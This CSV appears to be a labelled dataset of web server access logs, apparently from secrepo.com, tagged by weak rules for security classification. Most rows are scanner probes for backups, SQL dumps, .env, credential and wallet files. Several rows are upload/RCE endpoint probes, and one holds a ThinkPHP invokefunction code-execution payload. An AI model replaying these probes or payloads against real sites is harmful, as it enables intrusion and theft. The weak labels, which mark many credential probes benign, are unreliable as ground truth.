source_log,timestamp,ip,method,path,query,path_with_query,protocol,status,bytes,referer,user_agent,label,label_source,label_reason,text
2022-12-22,2022-12-22T14:31:39-08:00,185.92.25.55,HEAD,/bak/backup.rar,,/bak/backup.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T02:26:58-08:00,49.44.82.7,GET,/,,/,HTTP/1.1,301,438,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:59:40-08:00,185.192.16.11,HEAD,/www.sql,,/www.sql,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,POST,/uploads/dede/sys_verifies.php,action=down,/uploads/dede/sys_verifies.php?action=down,HTTP/1.1,418,746,http://www.secrepo.com/uploads/dede/sys_verifies.php?action=down,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/uploads/dede/sys_verifies.php QUERY=action=down PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:15:09-08:00,85.10.56.247,HEAD,/bak/www.tar,,/bak/www.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:09:58-08:00,194.169.217.1,HEAD,/back/public_html.rar,,/back/public_html.rar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:40:02-08:00,185.192.71.170,HEAD,/old/website.rar,,/old/website.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:44:04-08:00,98.159.226.188,HEAD,/backups/config.json,,/backups/config.json,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:17:11-08:00,84.247.59.175,HEAD,/config.json,,/config.json,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:10:14-08:00,188.212.135.105,HEAD,/bak/wallet.dat,,/bak/wallet.dat,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:26:26-08:00,120.245.60.11,GET,/robots.txt,,/robots.txt,HTTP/1.1,301,458,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/robots.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:15:38-08:00,212.30.37.137,HEAD,/old/backup.sql.tar,,/old/backup.sql.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.sql.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:13-08:00,98.159.226.241,HEAD,/old/website.tar,,/old/website.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:59:50-08:00,45.130.202.69,HEAD,/www.tar,,/www.tar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:58-08:00,84.247.59.159,HEAD,/.env,,/.env,HTTP/1.1,404,124,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/.env QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:29-07:00,44.195.86.98,GET,/wp-content/upload.php,,/wp-content/upload.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/wp-content/upload.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:16:07-08:00,212.30.33.45,HEAD,/back/www.rar,,/back/www.rar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:04:33-08:00,188.212.135.102,HEAD,/back/website.rar,,/back/website.rar,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:51:50-08:00,217.138.202.62,HEAD,/old/backup.rar,,/old/backup.rar,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:52:01-08:00,85.206.166.82,HEAD,/website.rar,,/website.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:50:25-08:00,194.169.217.150,HEAD,/backups/secrepo.com.sql,,/backups/secrepo.com.sql,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:52:40-08:00,185.195.19.200,HEAD,/bak/public_html.tar,,/bak/public_html.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:38:33-08:00,45.128.199.39,HEAD,/restore/bak.tar,,/restore/bak.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:13:02-08:00,194.169.217.215,HEAD,/bak/sftp-config.json,,/bak/sftp-config.json,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:31:37-08:00,45.67.99.142,HEAD,/backups/mysql.sql,,/backups/mysql.sql,HTTP/1.1,301,184,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:05:04-08:00,157.97.120.10,HEAD,/old/secrepo.com.rar,,/old/secrepo.com.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:20:49-08:00,82.118.30.73,HEAD,/back/.well-known.zip,,/back/.well-known.zip,HTTP/1.1,301,187,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/back/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:48:49-08:00,82.118.30.33,HEAD,/bak/website.tar,,/bak/website.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/website.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:53:53-08:00,157.97.120.9,HEAD,/old/wallet.dat,,/old/wallet.dat,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/wallet.dat QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:47:41-08:00,85.203.34.102,HEAD,/bak/www.sql,,/bak/www.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T23:07:40-08:00,194.38.20.161,GET,/assets/plugins/fileupload/server/php/index.php,file=tf2rghf.jpg,/assets/plugins/fileupload/server/php/index.php?file=tf2rghf.jpg,HTTP/1.1,429,487,,ALittle Client,command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/assets/plugins/fileupload/server/php/index.php QUERY=file=tf2rghf.jpg PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:02:21-08:00,45.86.200.113,HEAD,/backup/directory.tar,,/backup/directory.tar,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:43:12-08:00,45.8.17.9,HEAD,/backups/dump.sql,,/backups/dump.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:53:14-08:00,45.140.245.20,HEAD,/old/mysql.sql,,/old/mysql.sql,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T05:27:31-08:00,222.186.30.188,GET,/index.php,s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com,/index.php?s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com,HTTP/1.1,404,338,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",command_exec,weak_rule:command_exec,Code execution/webshell pattern,METHOD=GET PATH=/index.php QUERY=s=admin/\think\app/invokefunction&function=base64_encode&vars[]=ck996789baidu.com PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T20:51:24-07:00,34.217.115.110,GET,/Datasets Description/HTML_Bro_log_1/dns.html,,/Datasets Description/HTML_Bro_log_1/dns.html,HTTP/1.1,200,1837,,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/Datasets Description/HTML_Bro_log_1/dns.html QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:04-07:00,125.78.229.99,POST,/FCKeditor/editor/filemanager/connectors/asp/connector.asp,Command=FileUpload&Type=File&CurrentFolder=/,/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=/,HTTP/1.1,404,328,http://www.secrepo.com/FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=FileUpload&Type=File&CurrentFolder=%2F,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/FCKeditor/editor/filemanager/connectors/asp/connector.asp QUERY=Command=FileUpload&Type=File&CurrentFolder=/ PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:06:37-08:00,45.91.20.120,HEAD,/backup.sql,,/backup.sql,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:09:08-08:00,212.30.33.28,HEAD,/backup.rar,,/backup.rar,HTTP/1.1,301,177,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:28-07:00,44.195.86.98,GET,/ups.php,,/ups.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/ups.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:28:56-08:00,98.159.226.191,HEAD,/bak/bak.rar,,/bak/bak.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:16:43-08:00,85.10.56.247,HEAD,/www.rar,,/www.rar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:00:48-08:00,157.97.120.9,HEAD,/backups/credentials.txt,,/backups/credentials.txt,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/credentials.txt QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:04:41-08:00,98.159.226.187,HEAD,/backups/.env,,/backups/.env,HTTP/1.1,301,179,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backups/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:24:38-08:00,45.92.228.111,HEAD,/sftp-config.json,,/sftp-config.json,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/sftp-config.json QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:30:17-08:00,185.82.72.200,HEAD,/restore/website.rar,,/restore/website.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:59:48-08:00,93.115.7.123,HEAD,/old/www.rar,,/old/www.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:31:13-08:00,157.97.120.26,HEAD,/restore/.env,,/restore/.env,HTTP/1.1,301,179,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/restore/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:15:36-08:00,98.159.226.188,HEAD,/restore/sql.sql,,/restore/sql.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:18-08:00,45.91.21.30,HEAD,/backups/www.sql,,/backups/www.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:25:24-08:00,82.118.30.80,HEAD,/back/backup.sql,,/back/backup.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:21:11-08:00,45.86.200.152,HEAD,/.bash_history,,/.bash_history,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:41:16-08:00,45.89.242.190,HEAD,/directory.rar,,/directory.rar,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/directory.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:27:42-08:00,85.10.56.233,HEAD,/backups/sql.sql,,/backups/sql.sql,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/sql.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:25:30-07:00,44.195.86.98,GET,/upload.php,,/upload.php,HTTP/1.1,404,328,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36",command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=GET PATH=/upload.php QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:43:41-08:00,98.159.226.71,HEAD,/bak/www.rar,,/bak/www.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/www.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:24:06-08:00,212.30.33.22,HEAD,/restore/.well-known.zip,,/restore/.well-known.zip,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/restore/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:18:44-08:00,98.159.226.184,HEAD,/old/.well-known.zip,,/old/.well-known.zip,HTTP/1.1,404,275,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/old/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:47:13-08:00,85.10.56.234,HEAD,/restore/bak.rar,,/restore/bak.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:19:58-08:00,85.203.45.190,HEAD,/old/www.sql,,/old/www.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/www.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:48:38-08:00,45.128.199.81,HEAD,/back/backup.tar,,/back/backup.tar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/backup.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:52:44-08:00,45.134.22.48,HEAD,/restore/dump.sql,,/restore/dump.sql,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/dump.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T15:12:36-07:00,128.199.13.166,GET,/,,/,HTTP/1.0,200,49096,,"Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.102011-10-16 20:23:10",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/ QUERY= PROTOCOL=HTTP/1.0
2022-12-22,2022-12-22T13:30:12-08:00,98.159.226.176,HEAD,/backup/secrepo.com.rar,,/backup/secrepo.com.rar,HTTP/1.1,301,189,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:08:05-08:00,85.206.175.221,HEAD,/backups/.well-known.zip,,/backups/.well-known.zip,HTTP/1.1,301,190,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backups/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:23:25-08:00,185.195.19.202,HEAD,/BlockCypher.log,,/BlockCypher.log,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/BlockCypher.log QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:15:17-08:00,212.30.36.68,HEAD,/backups/directory.tar,,/backups/directory.tar,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:19:10-08:00,45.89.242.199,HEAD,/back/mysql.sql,,/back/mysql.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/mysql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:23:30-08:00,98.159.226.185,HEAD,/restore/backup.rar,,/restore/backup.rar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T11:58:36-08:00,212.30.37.121,HEAD,/restore/.bash_history,,/restore/.bash_history,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:42:44-08:00,185.192.71.170,HEAD,/old/public_html.tar,,/old/public_html.tar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/public_html.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:05:26-08:00,45.91.20.105,HEAD,/back/bak.tar,,/back/bak.tar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:10:44-08:00,98.159.226.29,HEAD,/back/directory.tar,,/back/directory.tar,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/directory.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:11:50-08:00,45.89.242.206,HEAD,/backup/.env,,/backup/.env,HTTP/1.1,301,178,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backup/.env QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:49:29-08:00,185.221.132.213,HEAD,/old/bak.rar,,/old/bak.rar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:14:27-08:00,45.130.202.68,HEAD,/old/sql.sql,,/old/sql.sql,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:20:44-08:00,84.247.59.22,HEAD,/restore/backup.sql,,/restore/backup.sql,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/restore/backup.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T23:20:02-07:00,5.159.232.239,GET,/wordpress/,,/wordpress/,HTTP/1.1,301,439,,-,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/wordpress/ QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T05:15:10-08:00,222.186.180.134,GET,/data/admin/allowurl.txt,,/data/admin/allowurl.txt,HTTP/1.1,404,338,,Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=GET PATH=/data/admin/allowurl.txt QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T12:27:06-07:00,125.78.229.99,POST,/index.php/api/Uploadify/preview,,/index.php/api/Uploadify/preview,HTTP/1.1,404,305,http://www.secrepo.com/index.php/api/Uploadify/preview,Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2),command_exec,weak_rule:upload_rce_probe,Upload/RCE endpoint probe,METHOD=POST PATH=/index.php/api/Uploadify/preview QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:50:18-08:00,82.118.30.1,HEAD,/bak.rar,,/bak.rar,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:40:43-08:00,185.195.237.149,HEAD,/backup/.well-known.zip,,/backup/.well-known.zip,HTTP/1.1,301,189,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/backup/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:56:03-08:00,194.169.217.44,HEAD,/bak/.well-known.zip,,/bak/.well-known.zip,HTTP/1.1,301,186,,-,suspicious_path_probe,weak_rule:suspicious_probe,Sensitive/exploit-prone path probe,METHOD=HEAD PATH=/bak/.well-known.zip QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:26:56-08:00,185.192.16.11,HEAD,/backups/public_html.rar,,/backups/public_html.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T10:39:15-07:00,51.77.205.250,GET,/honeypot/bsidesdfw - 2014.ipynb,,/honeypot/bsidesdfw - 2014.ipynb,HTTP/1.1,301,481,,Tornado-Async-Client,benign,default_benign,No weak-rule hit,METHOD=GET PATH=/honeypot/bsidesdfw - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:25:17-08:00,98.159.226.27,HEAD,/backups/.bash_history,,/backups/.bash_history,HTTP/1.1,301,188,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:18:28-08:00,91.219.236.219,HEAD,/back/www.sql,,/back/www.sql,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/www.sql QUERY= PROTOCOL=HTTP/1.1
2021-10-22,2021-10-22T17:18:08-07:00,101.89.239.238,GET,/honeypot/BSidesDFW - 2014.ipynb,,/honeypot/BSidesDFW - 2014.ipynb,HTTP/1.1,200,386900,,"Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 MicroMessenger/6.5.5 NetType/WIFI Language/en",benign,default_benign,No weak-rule hit,METHOD=GET PATH=/honeypot/BSidesDFW - 2014.ipynb QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:55:54-08:00,188.212.135.1,HEAD,/back/dump.sql,,/back/dump.sql,HTTP/1.1,301,180,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/dump.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:55:12-08:00,45.67.99.95,HEAD,/backups/secrepo.com.rar,,/backups/secrepo.com.rar,HTTP/1.1,301,190,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backups/secrepo.com.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:56:11-08:00,185.217.117.25,HEAD,/bak/website.rar,,/bak/website.rar,HTTP/1.1,301,182,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/website.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:04:18-08:00,212.30.33.26,HEAD,/back/www.tar,,/back/www.tar,HTTP/1.1,301,179,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/www.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:06:12-08:00,85.206.175.219,HEAD,/old/bak.tar,,/old/bak.tar,HTTP/1.1,301,178,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/old/bak.tar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T12:06:16-08:00,45.89.242.199,HEAD,/back/.bash_history,,/back/.bash_history,HTTP/1.1,301,185,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/.bash_history QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T15:53:35-08:00,196.244.192.37,HEAD,/bak/public_html.rar,,/bak/public_html.rar,HTTP/1.1,301,186,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/bak/public_html.rar QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T14:45:12-08:00,212.30.33.24,HEAD,/sql.sql,,/sql.sql,HTTP/1.1,301,174,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/sql.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:54:11-08:00,98.159.226.185,HEAD,/back/secrepo.com.sql,,/back/secrepo.com.sql,HTTP/1.1,301,187,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/back/secrepo.com.sql QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T13:32:26-08:00,45.86.200.149,HEAD,/ftpsync.settings,,/ftpsync.settings,HTTP/1.1,301,183,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/ftpsync.settings QUERY= PROTOCOL=HTTP/1.1
2022-12-22,2022-12-22T16:43:23-08:00,85.10.56.247,HEAD,/backup/www.sql,,/backup/www.sql,HTTP/1.1,301,181,,-,benign,default_benign,No weak-rule hit,METHOD=HEAD PATH=/backup/www.sql QUERY= PROTOCOL=HTTP/1.1
